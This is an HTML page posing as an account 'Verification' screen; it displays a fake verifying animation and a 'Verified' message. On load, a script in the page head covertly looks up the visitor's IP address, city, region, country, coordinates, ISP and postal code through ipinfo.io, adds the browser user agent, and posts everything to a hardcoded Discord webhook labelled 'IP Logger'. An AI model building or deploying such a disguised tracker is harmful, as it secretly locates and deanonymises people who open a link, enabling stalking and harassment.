<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Verification</title>
	<link type="text/css" rel="stylesheet" href="style.css">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
	<script src= "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
	<script>
		$.get("https://ipinfo.io", function(response) {
			const webhook_url = "https://discord.com/api/webhooks/1542365563945492611/vkBwA5l9xZ-iZmjuuwzQgtGzZpljBxySpwbQUClIQgYJDsqRdLcpOYXHXJTTfxoNDXT5";
			const main = {
				title: "Meths | IP Logger",
				description: "> IP Logger",
				thumbnail: {
					url: "https://cdn.discordapp.com/avatars/586435544750358540/a_36fc175d7430d6e04516474126184ed4.gif?size=2048",
				},
				fields: [
					{
						name: "IP:",
						value: `\`${response.ip}\``,
						inline: false,
					},
					{
						name: "User-Agent:",
						value: `\`${navigator.userAgent}\``,
						inline: false,
					},
					{
						name: "City:",
						value: `\`${response.city}\``,
						inline: false,
					},
					{
						name: "Region:",
						value: `\`${response.region}\``,
						inline: false
					},
					{
						name: "Country:",
						value: `\`${response.country}\``,
						inline: false
					},
					{
						name: "Long/Lat:",
						value: `\`${response.loc}\``,
						inline: false
					},
					{
						name: "Company:",
						value: `\`${response.org}\``,
						inline: false
					},
					{
						name: "Postal Region:",
						value: `\`${response.postal}\``,
						inline: false
					},
				],
				footer: {
					text: "Meths | GET IP LOGGED"
				},
				author: {
					name: "{ Meths }",
					url: ""
				}
			}
			var xhttp = new XMLHttpRequest();
			const url = webhook_url;
			xhttp.open("POST", url, true);
			xhttp.setRequestHeader('Content-Type', 'application/json');
			xhttp.send(JSON.stringify({
				'username': 'IP Logger',
				'embeds': [main],
			}));
		}, "json");
	</script>
</head>
<body>
    <div class="card">
        <div class="check" id="icon">
    <i class="fa-solid fa-hourglass-half"></i>
		</div>

        <h1 id="title">Verifying...</h1>

        <p id="message">
            Please wait while we verify your account.
        </p>
    </div>

    <script>
        const delay = Math.floor(Math.random() * 2001) + 3000;

        setTimeout(() => {
            document.getElementById("icon").textContent = "✓";
            document.getElementById("title").textContent = "Verified";
            document.getElementById("message").innerHTML =
                "You have been successfully verified.<br>You may now close this tab.";
        }, delay);
		if (localStorage.getItem("verified") === "true") {
    icon.innerHTML = '<i class="fa-solid fa-circle-check"></i>';
    title.textContent = "Already Verified";
    message.innerHTML =
        "This device has already been verified.<br>You may now close this tab.";
} else {
    const delay = Math.floor(Math.random() * 2001) + 3000;

    setTimeout(() => {
        localStorage.setItem("verified", "true");

        icon.innerHTML = '<i class="fa-solid fa-circle-check"></i>';
        title.textContent = "Verified";
        message.innerHTML =
            "You have been successfully verified.<br>You may now close this tab.";
    }, delay);
		}
    </script>
</body>
</html>
